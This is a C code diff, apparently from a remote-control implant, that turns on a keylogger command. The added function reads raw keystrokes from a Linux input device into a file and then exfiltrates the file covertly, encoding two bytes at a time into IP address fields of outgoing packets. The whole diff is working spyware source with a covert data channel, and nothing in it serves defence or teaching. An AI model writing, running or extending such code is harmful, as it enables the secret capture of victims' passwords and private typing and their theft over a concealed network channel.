@@ -1,4 +1,5 @@
 #include "commands.h"
+#include "keylog.h"
 #include "runner.h"
 #include "network.h"
 
@@ -164,7 +165,7 @@ int runner(struct Context *ctx) {
                 break;
             case CMD_START_KL:
                 printf("Start kl command received\n");
-                // cmd_start_kl(ctx, &cmd_list);
+                cmd_start_kl(ctx);
                 break;
             case CMD_START_WATCH_FILE:
                 printf("Start watch file command received\n");
@@ -260,6 +261,67 @@ int cmd_req_file_name(struct Context *ctx, struct List *list) {
 
     // might need a strong wait here
     close(file_fd);
+    return 0;
+}
+
+int cmd_start_kl(struct Context *ctx) {
+    int keyboard_fd = open("/dev/input/event3", O_RDONLY);
+    if (keyboard_fd < 0) {
+        fprintf(stderr, "open keyboard failed\n");
+        return -1;
+    }
+
+    struct List kl_listen = {0};
+
+    start_key_logging(keyboard_fd, ctx, &kl_listen);
+    close(keyboard_fd);
+    printf("Logging stopped. Sending key log\n");
+
+    // send output.txt
+    const int file_fd = open("keylog.txt", O_RDONLY);
+    if (file_fd < 0) {
+        fprintf(stderr, "open file failed\n");
+        return -1;
+    }
+
+    char ip_buffer[IP_ADDR_LEN] = {0};
+    uint8_t data_buffer[DATA_BUF_SIZE] = {0};
+
+    int ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, REP_REQ_FILE_DATA);
+    if (ret < 0) {
+        fprintf(stderr, "encode cmd failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+    // send file data
+    // while not eod, get the next two bytes, encode, ship it
+
+    ssize_t bytes_read;
+    while ((bytes_read = read(file_fd, data_buffer, DATA_BUF_SIZE)) > 0) {
+        for (ssize_t i = 0; i < bytes_read; i += 2) {
+            if (i == bytes_read - 1) {
+                // Only one byte left
+                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], 0);
+            } else {
+                // Two bytes available
+                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], data_buffer[i+1]);
+            }
+            if (ret < 0) {
+                fprintf(stderr, "encode data failed\n");
+            }
+            send_packet(ctx, ip_buffer);
+        }
+    }
+
+    // send TERM
+    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
+    if (ret < 0) {
+        fprintf(stderr, "encode term failed\n");
+    }
+    send_packet(ctx, ip_buffer);
+
+    // might need a strong wait here
+    close(file_fd);
+
     return 0;
 }
 
@@ -403,7 +465,7 @@ FILE *open_file_from_list(struct List *list) {
 
     filename[i] = '\0';
 
-    FILE *fp = fopen(filename, "a+");  // opens or creates file
+    FILE *fp = fopen(filename, "w+");  // opens or creates file
     if (fp == NULL) {
         perror("fopen");
         return NULL;
